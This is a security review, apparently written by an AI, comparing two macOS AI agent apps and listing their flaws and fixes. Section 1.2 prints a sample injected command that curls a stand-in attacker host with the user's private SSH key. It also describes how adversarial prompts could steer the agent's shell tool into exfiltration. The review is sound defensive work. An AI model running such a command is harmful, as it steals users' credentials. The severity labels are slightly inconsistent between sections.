# Security Review: Osaurus — with LCW Comparison & Improvement List

**Date:** April 4, 2026
**Reviewer:** Claude (automated deep-dive)
**Scope:** Full source code, dependencies, build infrastructure, CI/CD, networking, crypto, telemetry
**Projects:** Osaurus (441 Swift files, ~40 dependencies) vs. LocalCowork (33 Swift files, 0 dependencies)

---

## Executive Summary

Osaurus is a full-featured macOS AI harness with strong cryptographic identity, no external telemetry, and proper secrets management via Apple Keychain. Its primary security risks stem from its breadth: 3 branch-pinned dependencies (supply chain), a shell-execution tool that passes raw user input to `/bin/zsh -c` (command injection), and `disable-library-validation` for plugin loading. LocalCowork is a much smaller, zero-dependency project with excellent path traversal protection and actor-based concurrency, but its command-blocking approach is a regex blocklist that is inherently bypassable.

**Overall Risk Ratings:**

| Area | Osaurus | LCW |
|------|---------|-----|
| Supply Chain | MEDIUM | EXCELLENT (0 deps) |
| Command Injection | CRITICAL | MEDIUM |
| Path Traversal | MEDIUM (symlink risk) | EXCELLENT |
| Memory Safety | MEDIUM (@unchecked Sendable) | EXCELLENT |
| Telemetry / Privacy | EXCELLENT (none) | EXCELLENT (none) |
| Auth & Crypto | EXCELLENT (secp256k1) | N/A (localhost only) |
| Build Infrastructure | MEDIUM | LOW RISK |
| Plugin Security | MEDIUM (in-process dylib) | N/A |

---

## Part 1: Osaurus Security Review

### 1.1 Supply Chain — 3 Critical Findings

**Branch-Pinned Dependencies (HIGH):**

| Package | Source | Pin | Risk |
|---------|--------|-----|------|
| `mlx-swift-lm` | osaurus-ai (self) | `branch: "main"` | Breaking changes silently enter builds |
| `VecturaKit` | rryam (individual) | `branch: "main"` | Individual maintainer, no versioned releases |
| `swift-embeddings` | jkrukowski (individual) | `branch: "main"` | Individual maintainer, no versioned releases |

These packages resolve to floating commits with no version tag. A compromised or force-pushed `main` branch would silently enter builds. The Package.resolved file locks to a specific commit hash, but any `swift package update` pulls whatever is on `main`.

**Lesser-Known Publishers (MEDIUM):**
IkigaJSON (orlandos-nl), FluidAudio (FluidInference), SwiftMath (mgriebling), swift-sentencepiece (jkrukowski), swift-safetensors (jkrukowski) — all from individual developers with smaller community vetting compared to Apple or Hugging Face packages.

**Docker Base Image (MEDIUM):**
`sandbox/Dockerfile` uses `FROM alpine:latest` without a pinned version, making container builds non-reproducible.

**GitHub Actions (LOW):**
All actions use tag-based pins (`@v4`, `@v6`) rather than SHA pins. While these are from official publishers (actions/*, docker/*), tag-based pins can be moved.

**Positive:** 40 total resolved dependencies is reasonable for the feature set. Most are from Apple, Hugging Face, or well-known orgs. swift-secp256k1 is correctly pinned to `exact: "0.21.1"`.

---

### 1.2 Command Injection — CRITICAL

**File:** `Packages/OsaurusCore/Work/WorkFolderTools.swift` (lines 1020–1031)

```swift
let process = Process()
process.executableURL = URL(fileURLWithPath: "/bin/zsh")
process.arguments = ["-c", command]  // USER INPUT passed directly
process.currentDirectoryURL = rootPath
```

The `WorkShellRunTool.execute()` method passes the `command` parameter — sourced from LLM-generated JSON arguments — directly to a shell interpreter with `-c`. This allows arbitrary command execution: `{"command": "ls; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"}`.

**Impact:** Full command execution with app privileges. An adversarial prompt or compromised LLM response could exfiltrate secrets, install malware, or destroy data.

**Recommendation:** Replace shell-based execution with an allowlist + argv array approach (like LCW does), or at minimum implement the same blocking regex patterns LCW uses.

---

### 1.3 Process Execution — HIGH

**File:** `Packages/OsaurusRepository/PluginInstallManager.swift` (lines 270–272)

```swift
task.arguments = ["unzip", "-o", zipURL.path, "-d", destination.path]
```

File paths passed to `unzip` without validation for special characters. A malicious plugin ZIP filename could inject arguments.

**File:** `Packages/OsaurusRepository/CentralRepositoryManager.swift` (lines 74–77)

Git arguments are passed without validation. Special git options like `--git-dir` or `-c core.pager=` could escape intended scope.

---

### 1.4 Path Traversal — MEDIUM (Symlink Escape)

**File:** `Packages/OsaurusCore/Work/WorkFolderTools.swift` (lines 36–44)

```swift
let resolvedURL = rootPath.appendingPathComponent(cleanPath).standardized
guard resolvedURL.path.hasPrefix(rootPathString) else {
    throw WorkFolderToolError.pathOutsideRoot(relativePath)
}
```

Uses `.standardized` and `hasPrefix` for path validation, but does NOT resolve symlinks before checking. An attacker who can create a symlink inside the project folder can escape the sandbox. Compare to LCW's `.resolvingSymlinksInPath()` which is the correct approach.

**Missing:** No iterative URL-decoding (LCW does this to catch double-encoding attacks). No null-byte filtering.

---

### 1.5 Memory Safety — MEDIUM

**`@unchecked Sendable` usage:**
- `PluginDatabase.swift` (line 30) — uses `DispatchQueue` for synchronization
- `MemoryDatabase.swift` (line 31) — same pattern

These bypass Swift's compile-time thread-safety checks. While the `queue.sync` pattern works, it's fragile — future changes could introduce races without compiler warnings.

**`unsafeBitCast`:**
- `PluginDatabase.swift` (line 36) — casts `-1` to `sqlite3_destructor_type` (SQLITE_TRANSIENT pattern). Architecture-specific risk.

---

### 1.6 SQL Injection — LOW (Mitigated)

Parameterized queries are used correctly via `sqlite3_bind_*`. The `isForbiddenStatement()` blocklist (ATTACH, DETACH, LOAD_EXTENSION) is brittle — bypassable with SQL comments or whitespace — but the parameterized query approach makes this a defense-in-depth layer, not the primary control.

---

### 1.7 Telemetry & Privacy — EXCELLENT

No external analytics, crash reporting, or tracking detected. Debug logging writes only to `/tmp/osaurus_debug.log` (opt-in, local only). In-memory request logging (`InsightsService`) stores up to 500 entries in a ring buffer, never transmitted, cleared on restart.

All network calls go to user-configured endpoints (LLM providers), HuggingFace (public model metadata), GitHub (skill imports), and the Sparkle update feed.

---

### 1.8 Authentication & Crypto — EXCELLENT

Strong design: secp256k1 master key in iCloud Keychain with biometric auth, hierarchical key derivation (Master → Device → Agent), access keys in `osk-v1` format with counter-based replay prevention, and proper Keychain access controls (`kSecAttrAccessibleWhenUnlockedThisDeviceOnly`).

No weak crypto detected (no MD5/SHA1 for security, no weak RNG).

---

### 1.9 Build Infrastructure — MEDIUM

**Sparkle Download Without Integrity Check (CRITICAL):**
`scripts/release/generate_and_deploy_appcast.sh` downloads Sparkle 2.9.0 via `curl -L` without SHA256 verification. A MITM or compromised CDN could inject a malicious binary into the release pipeline.

**Sensitive File Cleanup:**
`private_key.txt` (Sparkle signing key) is created but never deleted after use.

**CI/CD Secrets:**
9 secrets used in release workflow — proper GitHub Actions secret handling, but broad `contents: write` permission.

**Positive:** Shell scripts use `set -euo pipefail`. Code signing is comprehensive. Sparkle update signatures are verified by the app (ed25519 public key in Info.plist).

---

### 1.10 Entitlements — MEDIUM

`disable-library-validation` is enabled, necessary for plugin loading but weakens macOS code signing protections. Combined with in-process dylib plugin loading, this creates a vector for malicious plugins to access all host APIs (Keychain, SQLite, inference, HTTP client).

---

## Part 2: LCW Security Review

### 2.1 Supply Chain — EXCELLENT

Zero external dependencies. Pure Swift stdlib + Foundation + SwiftUI. This is the strongest possible supply chain posture.

### 2.2 Command Injection — MEDIUM

**Strength:** 14-pattern regex blocklist covering shell metacharacters, sudo, rm, network tools, shell exec, eval, python -c, reverse shells, and launchctl. Case-insensitive matching.

**Weakness:** Blocklist-based approach is inherently bypassable. Missing patterns for `tee`, `dd`, `find -exec`, `$(...)` expansion inside allowed commands. However, the `shellWhich()` function that uses string interpolation into `-c` is internal-only (not user-facing).

**Note:** LCW's `CLAUDE.md` mandates argv arrays for subprocess execution, which is the correct architectural decision even though the blocklist provides runtime defense.

### 2.3 Path Traversal — EXCELLENT

LCW's `FileOperations.resolve()` is best-in-class:
- Null-byte filtering
- Absolute path rejection
- Iterative URL-decoding (catches double/triple encoding)
- `.resolvingSymlinksInPath()` before prefix check
- Trailing-slash normalization

This is strictly superior to Osaurus's path validation.

### 2.4 Memory Safety — EXCELLENT

No `UnsafePointer`, `unsafeBitCast`, or `@unchecked Sendable`. Proper actor isolation throughout (`ProviderManager`, `LLMService`, `ProjectStore`). Full `Sendable` conformance on data types.

### 2.5 Telemetry — EXCELLENT

No analytics, tracking, or crash reporting of any kind.

### 2.6 Networking — LOW RISK

All connections are localhost HTTP only (127.0.0.1). Ephemeral URLSession (no persistent cookies/cache). No certificate pinning needed for localhost.

---

## Part 3: Feature Comparison

| Feature | Osaurus | LCW | Notes |
|---------|---------|-----|-------|
| **Swift files** | 441 | 33 | Osaurus is ~13x larger |
| **External dependencies** | 40 (resolved) | 0 | LCW is zero-dep |
| **LLM providers** | MLX, OpenAI, Anthropic, Gemini, xAI, Venice, OpenRouter, Ollama, LM Studio, Apple FM | Ollama, OpenAI, MLX-LM | Osaurus has broader provider support |
| **Agent system** | Multi-agent with independent memory/themes | Single agent runner (10-step loop) | Osaurus is more sophisticated |
| **Memory** | 4-layer (profile, working, summaries, knowledge graph) + SQLite + vector search | None | Major gap for LCW |
| **Identity/Crypto** | secp256k1 hierarchy, osk-v1 access keys, iCloud Keychain | None | Major gap for LCW |
| **Sandbox** | Alpine Linux VM (Apple Virtualization), per-agent isolation | Project-folder file sandbox only | Osaurus has true isolation |
| **Plugin system** | v1/v2 ABI, dylib loading, central registry, hot reload | None | Major gap for LCW |
| **MCP support** | Full server + client | None | Major gap for LCW |
| **Work mode** | Multi-step decomposition, issue tracking, parallel execution | Basic task/cowork/chat modes | Osaurus is more advanced |
| **Voice** | On-device transcription (FluidAudio), wake word, VAD | None | Feature gap |
| **Networking** | HTTP server (swift-nio), relay tunnel, LAN exposure | Localhost only | Osaurus has network features |
| **CLI** | Full CLI (`osaurus serve/ui/status/tools/*`) | None | Feature gap |
| **Auto-update** | Sparkle framework | None | Feature gap |
| **CI/CD** | GitHub Actions (test, build, release, notarize) | Local Makefile only | Osaurus has full pipeline |
| **Path traversal protection** | `.standardized` + `hasPrefix` (no symlink resolution) | `.resolvingSymlinksInPath()` + iterative URL decode + null byte check | **LCW is superior** |
| **Command execution** | Raw shell `-c` (CRITICAL) | Argv array + 14-pattern blocklist | **LCW is superior** |
| **Concurrency safety** | `@unchecked Sendable` (compiler bypass) | Proper actor isolation, full `Sendable` | **LCW is superior** |
| **Code signing** | Developer ID + notarization | Ad-hoc only | Osaurus is production-ready |

---

## Part 4: Improvement List for LCW

Based on this comparison, here are prioritized improvements for LocalCowork, organized by what would bring the most security and functionality value:

### CRITICAL — Security Fixes to Adopt from Osaurus Patterns

1. **Add Keychain-based secrets management**
   - LCW stores config as plain JSON in `~/.config/ApplicationSupport/LocalCowork/`
   - Osaurus stores all secrets in macOS Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`
   - LCW should move API keys and sensitive config to Keychain
   - Estimated effort: 1–2 days

2. **Strengthen command blocklist → allowlist**
   - LCW's 14-pattern blocklist is good but bypassable
   - Move to an allowlist of permitted commands (like `git`, `swift`, `make`, etc.) with argument validation
   - Keep the blocklist as a second defense layer
   - Estimated effort: 1 day

3. **Add response size limits on LLM provider responses**
   - LCW's `LLMService.get()` has no max size validation
   - A compromised localhost provider could send GBs of JSON for memory exhaustion
   - Add `URLSession` delegate with byte-count limits
   - Estimated effort: 0.5 days

### HIGH — Features to Port from Osaurus

4. **Memory system (4-layer)**
   - LCW has no memory between conversations
   - Start with Layer 1 (user profile) and Layer 2 (working memory structured entries)
   - Use SQLite for persistence (Osaurus pattern: `MemoryDatabase.swift`)
   - Add vector embeddings later (VecturaKit or custom)
   - Estimated effort: 1–2 weeks

5. **MCP server support**
   - Osaurus exposes itself as an MCP server, enabling integration with Cursor, Claude Desktop, etc.
   - LCW should implement at minimum MCP server on stdio
   - Use `modelcontextprotocol/swift-sdk` (well-maintained, version-pinned)
   - Estimated effort: 1 week

6. **Plugin system (basic v1)**
   - LCW has no extensibility mechanism
   - Start with a simple tool registration API (JSON schema for tool definitions)
   - Don't need the full dylib ABI yet — start with subprocess-based plugins
   - Subprocess approach avoids Osaurus's `disable-library-validation` entitlement issue
   - Estimated effort: 1–2 weeks

7. **Multi-agent support**
   - LCW has a single agent runner
   - Add agent definitions with independent system prompts, tool access, and (eventually) memory
   - Osaurus's `AgentManager` pattern is a good reference
   - Estimated effort: 1 week

### MEDIUM — Infrastructure Improvements

8. **Add CI/CD pipeline**
   - LCW has no GitHub Actions
   - Port Osaurus's `ci.yml` pattern: swift test + swiftlint + shellcheck
   - Add code signing with Developer ID for distribution
   - Estimated effort: 2–3 days

9. **SQLite persistence layer**
   - LCW uses JSON files for all storage
   - JSON doesn't support concurrent access, querying, or indexing
   - Add SQLite for conversations, memory, and tool state
   - Osaurus pattern: `Storage/*.swift` with DispatchQueue serialization
   - Better: Use proper actor isolation (LCW's strength) instead of `@unchecked Sendable`
   - Estimated effort: 3–5 days

10. **HTTP server for external integrations**
    - LCW is UI-only with no API
    - Add a local HTTP server (swift-nio) for CLI tools, other apps, and MCP
    - Osaurus serves OpenAI/Anthropic/Ollama-compatible APIs
    - Estimated effort: 1 week

11. **Work mode with issue tracking**
    - LCW has basic task/cowork modes
    - Port Osaurus's work decomposition: break tasks into tracked issues, parallel execution, max iteration limits
    - Estimated effort: 1 week

12. **Auto-update mechanism**
    - LCW requires manual updates
    - Sparkle is well-tested but adds a dependency
    - Alternative: simple GitHub release check + download prompt
    - Estimated effort: 2–3 days

### LOW — Nice-to-Have Enhancements

13. **Voice input** — On-device transcription via FluidAudio or Apple Speech framework
14. **Sandbox VM** — Apple Virtualization for true process isolation (requires macOS 26+)
15. **Cryptographic identity** — secp256k1 key hierarchy for verifiable agent actions
16. **Relay/tunnel** — Expose agents via WebSocket for remote access
17. **Skills system** — Import reusable AI capabilities from GitHub repos

### Things LCW Should NOT Change (LCW is Already Better)

- **Zero external dependencies** — This is a massive security advantage. Add dependencies only when absolutely necessary and always pin to exact versions.
- **Path traversal protection** — LCW's `resolve()` with symlink resolution and iterative URL-decoding is superior to Osaurus. Do not regress.
- **Actor-based concurrency** — LCW's proper actor isolation is better than Osaurus's `@unchecked Sendable` pattern. Keep this approach as new features are added.
- **No `disable-library-validation`** — If adding plugins, prefer subprocess-based isolation over in-process dylib loading. This avoids the entitlement weakening Osaurus requires.

---

## Appendix: All Findings Summary

### Osaurus Vulnerabilities

| # | Category | Severity | File | Status |
|---|----------|----------|------|--------|
| 1 | Command Injection (shell -c) | CRITICAL | WorkFolderTools.swift:1020 | Needs fix |
| 2 | Supply Chain (branch pins) | HIGH | Package.swift (3 deps) | Needs version pins |
| 3 | Sparkle download no integrity | HIGH | generate_and_deploy_appcast.sh:16 | Needs SHA256 check |
| 4 | Path Traversal (symlink) | MEDIUM | WorkFolderTools.swift:36 | Needs symlink resolution |
| 5 | @unchecked Sendable | MEDIUM | PluginDatabase, MemoryDatabase | Needs proper actors |
| 6 | disable-library-validation | MEDIUM | osaurus.entitlements | Document necessity |
| 7 | Alpine:latest unpinned | MEDIUM | sandbox/Dockerfile | Pin version |
| 8 | Private key not cleaned | MEDIUM | generate_and_deploy_appcast.sh | Add cleanup |
| 9 | SQL blocklist brittle | LOW | PluginDatabase.swift:263 | Harden |
| 10 | Deserialization no validation | LOW | InstalledPluginsStore.swift:43 | Add schema checks |

### LCW Vulnerabilities

| # | Category | Severity | File | Status |
|---|----------|----------|------|--------|
| 1 | Command blocklist bypassable | MEDIUM | CommandRunner.swift:18 | Move to allowlist |
| 2 | No response size limits | LOW | LLMService.swift:154 | Add byte limits |
| 3 | shellWhich interpolation | LOW | ProviderManager.swift:288 | Internal only |
| 4 | Plain-text config storage | LOW | ProjectStore.swift | Move secrets to Keychain |
| 5 | Ad-hoc code signing | LOW | bundle.sh:67 | Add Developer ID |
| 6 | No entitlements plist | LOW | Info.plist | Add for distribution |

---

*Report generated by automated security analysis. Findings should be verified by manual review before implementation.*
